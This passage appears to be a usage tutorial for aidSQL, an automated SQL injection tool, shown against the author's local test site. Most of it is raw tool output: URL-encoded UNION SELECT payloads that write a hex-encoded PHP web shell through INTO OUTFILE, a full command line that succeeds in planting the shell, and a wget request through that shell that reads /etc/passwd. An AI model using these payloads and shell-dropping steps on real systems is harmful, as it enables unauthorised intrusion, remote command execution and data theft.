[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e%2C0x6937326463%29%2C2+INTO+OUTFILE+%27%2Fusr%2Flocal%2Fwww%2Ftesting%2Feda.php%27+%23                                                                                                         
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2CLOAD_FILE%280x2f7573722f6c6f63616c2f7777772f74657374696e672f6564612e706870%29%2C0x6937326463%29%2C2+LIMIT+1%2C1+%23             
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Trying to inject shell in "/usr/local/www/www.aidsql.com/testing/eda.php"                    
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e%2C0x6937326463%29%2C2+INTO+OUTFILE+%27%2Fusr%2Flocal%2Fwww%2Fwww.aidsql.com%2Ftesting%2Feda.php%27+%23                                                                                        
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2CLOAD_FILE%280x2f7573722f6c6f63616c2f7777772f7777772e61696473716c2e636f6d2f74657374696e672f6564612e706870%29%2C0x6937326463%29%2C2+LIMIT+1%2C1+%23                                                                                                            
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Trying to inject shell in "/usr/local/www/aidsql.com/testing/eda.php"                        
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e%2C0x6937326463%29%2C2+INTO+OUTFILE+%27%2Fusr%2Flocal%2Fwww%2Faidsql.com%2Ftesting%2Feda.php%27+%23                                                                                            
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2CLOAD_FILE%280x2f7573722f6c6f63616c2f7777772f61696473716c2e636f6d2f74657374696e672f6564612e706870%29%2C0x6937326463%29%2C2+LIMIT+1%2C1+%23                                                                                                                    
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Trying to inject shell in "/www/testing/eda.php"                                             
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e%2C0x6937326463%29%2C2+INTO+OUTFILE+%27%2Fwww%2Ftesting%2Feda.php%27+%23                                                                                                                       
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2CLOAD_FILE%280x2f7777772f74657374696e672f6564612e706870%29%2C0x6937326463%29%2C2+LIMIT+1%2C1+%23                                 
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Trying to inject shell in "/www/www.aidsql.com/testing/eda.php"                              
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e%2C0x6937326463%29%2C2+INTO+OUTFILE+%27%2Fwww%2Fwww.aidsql.com%2Ftesting%2Feda.php%27+%23                                                                                                      
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2CLOAD_FILE%280x2f7777772f7777772e61696473716c2e636f6d2f74657374696e672f6564612e706870%29%2C0x6937326463%29%2C2+LIMIT+1%2C1+%23   
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Trying to inject shell in "/www/aidsql.com/testing/eda.php"                                  
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e%2C0x6937326463%29%2C2+INTO+OUTFILE+%27%2Fwww%2Faidsql.com%2Ftesting%2Feda.php%27+%23                                                                                                          
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2CLOAD_FILE%280x2f7777772f61696473716c2e636f6d2f74657374696e672f6564612e706870%29%2C0x6937326463%29%2C2+LIMIT+1%2C1+%23           
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Trying to inject shell in "/var/www/writable/eda.php"                                        
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e%2C0x6937326463%29%2C2+INTO+OUTFILE+%27%2Fvar%2Fwww%2Fwritable%2Feda.php%27+%23                                                                                                                
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2CLOAD_FILE%280x2f7661722f7777772f7772697461626c652f6564612e706870%29%2C0x6937326463%29%2C2+LIMIT+1%2C1+%23                       
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Trying to inject shell in "/var/www/www.aidsql.com/writable/eda.php"                         
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e%2C0x6937326463%29%2C2+INTO+OUTFILE+%27%2Fvar%2Fwww%2Fwww.aidsql.com%2Fwritable%2Feda.php%27+%23                                                                                               
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2CLOAD_FILE%280x2f7661722f7777772f7777772e61696473716c2e636f6d2f7772697461626c652f6564612e706870%29%2C0x6937326463%29%2C2+LIMIT+1%2C1+%23                                                                                                                      
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Trying to inject shell in "/var/www/aidsql.com/writable/eda.php"                             
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e%2C0x6937326463%29%2C2+INTO+OUTFILE+%27%2Fvar%2Fwww%2Faidsql.com%2Fwritable%2Feda.php%27+%23                                                                                                   
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2CLOAD_FILE%280x2f7661722f7777772f61696473716c2e636f6d2f7772697461626c652f6564612e706870%29%2C0x6937326463%29%2C2+LIMIT+1%2C1+%23 
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Trying to inject shell in "/usr/local/www/writable/eda.php"                                  
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e%2C0x6937326463%29%2C2+INTO+OUTFILE+%27%2Fusr%2Flocal%2Fwww%2Fwritable%2Feda.php%27+%23                                                                                                        
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2CLOAD_FILE%280x2f7573722f6c6f63616c2f7777772f7772697461626c652f6564612e706870%29%2C0x6937326463%29%2C2+LIMIT+1%2C1+%23           
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Trying to inject shell in "/usr/local/www/www.aidsql.com/writable/eda.php"                   
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e%2C0x6937326463%29%2C2+INTO+OUTFILE+%27%2Fusr%2Flocal%2Fwww%2Fwww.aidsql.com%2Fwritable%2Feda.php%27+%23                                                                                       
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2CLOAD_FILE%280x2f7573722f6c6f63616c2f7777772f7777772e61696473716c2e636f6d2f7772697461626c652f6564612e706870%29%2C0x6937326463%29%2C2+LIMIT+1%2C1+%23                                                                                                          
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Trying to inject shell in "/usr/local/www/aidsql.com/writable/eda.php"                       
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e%2C0x6937326463%29%2C2+INTO+OUTFILE+%27%2Fusr%2Flocal%2Fwww%2Faidsql.com%2Fwritable%2Feda.php%27+%23                                                                                           
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2CLOAD_FILE%280x2f7573722f6c6f63616c2f7777772f61696473716c2e636f6d2f7772697461626c652f6564612e706870%29%2C0x6937326463%29%2C2+LIMIT+1%2C1+%23                                                                                                                  
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Trying to inject shell in "/www/writable/eda.php"                                            
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e%2C0x6937326463%29%2C2+INTO+OUTFILE+%27%2Fwww%2Fwritable%2Feda.php%27+%23                                                                                                                      
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2CLOAD_FILE%280x2f7777772f7772697461626c652f6564612e706870%29%2C0x6937326463%29%2C2+LIMIT+1%2C1+%23                               
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Trying to inject shell in "/www/www.aidsql.com/writable/eda.php"                             
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e%2C0x6937326463%29%2C2+INTO+OUTFILE+%27%2Fwww%2Fwww.aidsql.com%2Fwritable%2Feda.php%27+%23                                                                                                     
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2CLOAD_FILE%280x2f7777772f7777772e61696473716c2e636f6d2f7772697461626c652f6564612e706870%29%2C0x6937326463%29%2C2+LIMIT+1%2C1+%23 
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Trying to inject shell in "/www/aidsql.com/writable/eda.php"                                 
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2C0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e%2C0x6937326463%29%2C2+INTO+OUTFILE+%27%2Fwww%2Faidsql.com%2Fwritable%2Feda.php%27+%23                                                                                                         
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6965616134%2CLOAD_FILE%280x2f7777772f61696473716c2e636f6d2f7772697461626c652f6564612e706870%29%2C0x6937326463%29%2C2+LIMIT+1%2C1+%23         
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: ieaa4 - i72dc                                                          
[aidSQL\core\Runner][WW] Couldn't get shell :(                                                                               
                                                 
real 0m0.996s                          
user 0m0.240s
sys  0m0.056s

```

## Getting a basic shell ##


Now as you see, the mysql5 plugin wasnt able to get a shell, lets provide this plugin some unix path information for it to get a shell for us in this case, I know the full path where the app is hosted so Ill give it that.

See that I have taken OUT the crawling depth option, theres no need to crawl for links!
We have already identified the vulnerable link before. Although the crawler will have
something really important in order this attack to succeed, which is, the gathering of path information found in images and other files that are available in this web.
We also have other informations, such as the field count, the ending and comment payloads. We will use this information to make the shell
injection go faster.

```
time ./aidSQL --url="http://www.aidsql.com/index.php?id=1" \
--sqli-mysql5-numeric-only=1 \
--sqli-mysql5-field-payloads="'" \
--info-defaults-unix-directories=/home/stalker/WWW/aidsql/ \
--sqli-mysql5-start-offset=2 \
--sqli-mysql5-ending-payloads="LIMIT 1,1" \
--sqli-mysql5-comment-payloads="#"

[aidSQL\core\PluginLoader][II] Site added www.aidsql.com
[aidSQL\core\PluginLoader][II] Normalized URL: http://www.aidsql.com/
[aidSQL\http\Crawler][II] ->                              
[aidSQL\http\Crawler][II] Fetching content from http://www.aidsql.com/
[aidSQL\http\Crawler][II] 200 OK                         
[aidSQL\http\Crawler][II] Found 1 images
```

**`[aidSQL\http\Crawler][II] Add file writable/test.jpg`**

```

......
......
......

[aidSQL\http\Crawler][II] 1. {http://www.aidsql.com/index.php?id=1}             {GET}

[aidSQL\core\PluginLoader][II] Load sqli => mysql5 ... OK
[aidSQL\core\Runner][II] Testing aidSQL\plugin\sqli\MySQL5 sql injection plugin...
[aidSQL\plugin\sqli\MySQL5][II] [id] Attempt:   2                             
[aidSQL\plugin\sqli\MySQL5][II] Comment Payload:        #
[aidSQL\plugin\sqli\MySQL5][II] Ending Payload: LIMIT 1,1
[aidSQL\plugin\sqli\MySQL5][II] Field Payload:  '
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6964313162%2C1%2C0x6930363965%29%2CCONCAT%280x6964313162%2C2%2C0x6930363965%29+LIMIT+1%2C1+%23                                               
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: id11b - i069e                                                          
[aidSQL\plugin\sqli\MySQL5][II] HTTP 200                                                                                     
[aidSQL\plugin\sqli\MySQL5][II] http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+CONCAT%280x6964313162%2C1%2C0x6930363965%29%2CCONCAT%280x6964313162%2C2%2C0x6930363965%29+LIMIT+1%2C1+%23                                                        
[aidSQL\plugin\sqli\MySQL5][II] FOUND SQL INJECTION!!!                                                                       
[aidSQL\plugin\sqli\MySQL5][II] Affected Variable:      id                                                                   
[aidSQL\plugin\sqli\MySQL5][II] Affected Fields:        1,1,2,2                                                              
[aidSQL\plugin\sqli\MySQL5][II] Field Count:    2                                                                            
[aidSQL\plugin\sqli\MySQL5][II] Picking field "2" to perform further analysis ...                                            
[aidSQL\plugin\sqli\MySQL5][II] Site is vulnerable to sql injection!!                                                        
[aidSQL\plugin\sqli\MySQL5][II] Doing DATABASE() Injection                                                                   
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+1%2CCONCAT%280x6964313162%2CDATABASE%28%29%2C0x6930363965%29+LIMIT+1%2C1+%23                                                                            
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: id11b - i069e                                                          
[aidSQL\plugin\sqli\MySQL5][II] Doing USER() Injection                                                                       
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+1%2CCONCAT%280x6964313162%2CUSER%28%29%2C0x6930363965%29+LIMIT+1%2C1+%23                                                                                
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: id11b - i069e                                                          
[aidSQL\plugin\sqli\MySQL5][II] Doing GROUP_CONCAT(TABLE_NAME) Injection                                                     
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+1%2CCONCAT%280x6964313162%2CGROUP_CONCAT%28TABLE_NAME%29%2C0x6930363965%29+FROM+information_schema.tables+WHERE+table_schema%3DDATABASE%28%29+LIMIT+1%2C1+%23                                                                                                                        
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: id11b - i069e                                                          
[aidSQL\core\Runner][II] BASIC INFORMATION                                                                                   
[aidSQL\core\Runner][II] ---------------------------------                                                                   
[aidSQL\core\Runner][II] PLUGIN         :       MySQL5 Standard Plugin by Juan Stange                                        
[aidSQL\core\Runner][II] DBASE          :       test                                                                         
[aidSQL\core\Runner][II] USER           :       root@localhost                                                               
[aidSQL\core\Runner][II] TABLES         :       news                                                                         
[aidSQL\core\Runner][II] IS ROOT        :       YES                                                                          
[aidSQL\core\Runner][EE] Trying to get Shell ...                                                                             
[aidSQL\core\PluginLoader][II] Load info => defaults ... OK                                                                  
[aidSQL\plugin\info\InfoPlugin][II] Trying to discover default directory locations ...                                       
[aidSQL\plugin\info\InfoPlugin][II] http://www.aidsql.com/templates_c ...                                                    
[aidSQL\plugin\info\InfoPlugin][II] http://www.aidsql.com/img ...                                                            
[aidSQL\plugin\info\InfoPlugin][II] http://www.aidsql.com/image ...                                                          
[aidSQL\plugin\info\InfoPlugin][II] http://www.aidsql.com/images ...                                                         
[aidSQL\plugin\info\InfoPlugin][II] http://www.aidsql.com/tmp ...                                                            
[aidSQL\plugin\info\InfoPlugin][II] http://www.aidsql.com/temp ...                                                           
[aidSQL\plugin\info\InfoPlugin][II] http://www.aidsql.com/test ...                                                           
[aidSQL\plugin\info\InfoPlugin][WW] No possible default writable web path was found :(                                       
[aidSQL\plugin\sqli\MySQL5][II] Adding crawler path information: writable                                                    
[aidSQL\plugin\sqli\MySQL5][II] Adding crawler path information: testing                                                     
[aidSQL\plugin\sqli\MySQL5][II] Trying to inject shell in "/home/stalker/WWW/aidsql//fce.php"                                
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+1%2CCONCAT%280x6964313162%2C0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e%2C0x6930363965%29+INTO+OUTFILE+%27%2Fhome%2Fstalker%2FWWW%2Faidsql%2F%2Ffce.php%27+%23                                                                                                    
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: id11b - i069e                                                          
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+1%2CCONCAT%280x6964313162%2CLOAD_FILE%280x2f686f6d652f7374616c6b65722f5757572f61696473716c2f2f6663652e706870%29%2C0x6930363965%29+LIMIT+1%2C1+%23       
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: id11b - i069e                                                          
[aidSQL\plugin\sqli\MySQL5][II] Trying to inject shell in "/home/stalker/WWW/aidsql/www.aidsql.com//fce.php"                 
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+1%2CCONCAT%280x6964313162%2C0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e%2C0x6930363965%29+INTO+OUTFILE+%27%2Fhome%2Fstalker%2FWWW%2Faidsql%2Fwww.aidsql.com%2F%2Ffce.php%27+%23                                                                                   
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: id11b - i069e                                                          
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+1%2CCONCAT%280x6964313162%2CLOAD_FILE%280x2f686f6d652f7374616c6b65722f5757572f61696473716c2f7777772e61696473716c2e636f6d2f2f6663652e706870%29%2C0x6930363965%29+LIMIT+1%2C1+%23                                                                                                      
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: id11b - i069e                                                          
[aidSQL\plugin\sqli\MySQL5][II] Trying to inject shell in "/home/stalker/WWW/aidsql/aidsql.com//fce.php"                     
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+1%2CCONCAT%280x6964313162%2C0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e%2C0x6930363965%29+INTO+OUTFILE+%27%2Fhome%2Fstalker%2FWWW%2Faidsql%2Faidsql.com%2F%2Ffce.php%27+%23                                                                                       
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: id11b - i069e                                                          
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+1%2CCONCAT%280x6964313162%2CLOAD_FILE%280x2f686f6d652f7374616c6b65722f5757572f61696473716c2f61696473716c2e636f6d2f2f6663652e706870%29%2C0x6930363965%29+LIMIT+1%2C1+%23                                                                                                              
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: id11b - i069e                                                          
[aidSQL\plugin\sqli\MySQL5][II] Trying to inject shell in "/home/stalker/WWW/aidsql/testing/fce.php"                         
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+1%2CCONCAT%280x6964313162%2C0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e%2C0x6930363965%29+INTO+OUTFILE+%27%2Fhome%2Fstalker%2FWWW%2Faidsql%2Ftesting%2Ffce.php%27+%23                                                                                             
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: id11b - i069e                                                          
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+1%2CCONCAT%280x6964313162%2CLOAD_FILE%280x2f686f6d652f7374616c6b65722f5757572f61696473716c2f74657374696e672f6663652e706870%29%2C0x6930363965%29+LIMIT+1%2C1+%23                                                                                                                      
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: id11b - i069e                                                          
[aidSQL\plugin\sqli\MySQL5][II] Trying to inject shell in "/home/stalker/WWW/aidsql/www.aidsql.com/testing/fce.php"          
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+1%2CCONCAT%280x6964313162%2C0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e%2C0x6930363965%29+INTO+OUTFILE+%27%2Fhome%2Fstalker%2FWWW%2Faidsql%2Fwww.aidsql.com%2Ftesting%2Ffce.php%27+%23                                                                            
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: id11b - i069e                                                          
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+1%2CCONCAT%280x6964313162%2CLOAD_FILE%280x2f686f6d652f7374616c6b65722f5757572f61696473716c2f7777772e61696473716c2e636f6d2f74657374696e672f6663652e706870%29%2C0x6930363965%29+LIMIT+1%2C1+%23                                                                                        
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: id11b - i069e                                                          
[aidSQL\plugin\sqli\MySQL5][II] Trying to inject shell in "/home/stalker/WWW/aidsql/aidsql.com/testing/fce.php"              
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+1%2CCONCAT%280x6964313162%2C0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e%2C0x6930363965%29+INTO+OUTFILE+%27%2Fhome%2Fstalker%2FWWW%2Faidsql%2Faidsql.com%2Ftesting%2Ffce.php%27+%23                                                                                
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: id11b - i069e                                                          
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+1%2CCONCAT%280x6964313162%2CLOAD_FILE%280x2f686f6d652f7374616c6b65722f5757572f61696473716c2f61696473716c2e636f6d2f74657374696e672f6663652e706870%29%2C0x6930363965%29+LIMIT+1%2C1+%23                                                                                                
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: id11b - i069e                                                          
[aidSQL\plugin\sqli\MySQL5][II] Trying to inject shell in "/home/stalker/WWW/aidsql/writable/fce.php"                        
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+1%2CCONCAT%280x6964313162%2C0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e%2C0x6930363965%29+INTO+OUTFILE+%27%2Fhome%2Fstalker%2FWWW%2Faidsql%2Fwritable%2Ffce.php%27+%23                                                                                            
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: id11b - i069e
[aidSQL\plugin\sqli\MySQL5][II] Fetching http://www.aidsql.com/index.php?id=1%27+UNION+ALL+SELECT+1%2CCONCAT%280x6964313162%2CLOAD_FILE%280x2f686f6d652f7374616c6b65722f5757572f61696473716c2f7772697461626c652f6663652e706870%29%2C0x6930363965%29+LIMIT+1%2C1+%23          
[aidSQL\plugin\sqli\MySQL5][II] String identifier is: id11b - i069e
[aidSQL\core\Runner][II] Got Shell => http://www.aidsql.com/writable/fce.php
            
real    0m0.386s                           
user    0m0.120s                           
sys     0m0.044s    

--------
```
## Executing shell commands ##


So now that we have the shell, lets just cat /etc/passwd, a classic attack:

```

stalker@hardcore:~/Projects/aidsql/branches>wget "http://www.aidsql.com/writable/fce.php?cmd=cat /etc/passwd" -O passwd     
--2011-01-11 10:43:19--  http://www.aidsql.com/writable/dfab.php?cmd=cat%20/etc/passwd                                       
Resolving www.aidsql.com... 127.0.0.1                                                                                        
Connecting to www.aidsql.com|127.0.0.1|:80... connected.                                                                     
HTTP request sent, awaiting response... 200 OK                                                                               
Length: 1923 (1.9K) [text/html]                                                                                              
Saving to: `passwd'                                                                                                               
100%[===================================================================================>] 1,923       --.-K/s   in 0s       
                                                                                                                             
2011-01-11 10:43:19 (72.5 MB/s) - `passwd' saved [1923/1923]                                                                 
                                                                                                                             
stalker@hardcore:~/Projects/aidsql/branches>cat passwd                                                                       
1       Some text blah                                                                                                       
i2f5eroot:x:0:0:root:/root:/bin/bash                                                                                         
daemon:x:1:1:daemon:/usr/sbin:/bin/sh                                                                                        
bin:x:2:2:bin:/bin:/bin/sh                                                                                                   
sys:x:3:3:sys:/dev:/bin/sh                                                                                                   
sync:x:4:65534:sync:/bin:/bin/sync                                                                                           
games:x:5:60:games:/usr/games:/bin/sh                                                                                        
man:x:6:12:man:/var/cache/man:/bin/sh                                                                                        
lp:x:7:7:lp:/var/spool/lpd:/bin/sh                                                                                           
mail:x:8:8:mail:/var/mail:/bin/sh                                                                                            
news:x:9:9:news:/var/spool/news:/bin/sh                                                                                      
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh                                                                                    
proxy:x:13:13:proxy:/bin:/bin/sh                                                                                             
www-data:x:33:33:www-data:/var/www:/bin/sh                                                                                   
backup:x:34:34:backup:/var/backups:/bin/sh                                                                                   
list:x:38:38:Mailing List Manager:/var/list:/bin/sh                                                                          
irc:x:39:39:ircd:/var/run/ircd:/bin/sh                                                                                       
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh                                                      
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh                                                                             
libuuid:x:100:101::/var/lib/libuuid:/bin/sh                                                                                  
syslog:x:101:103::/home/syslog:/bin/false                                                                                    
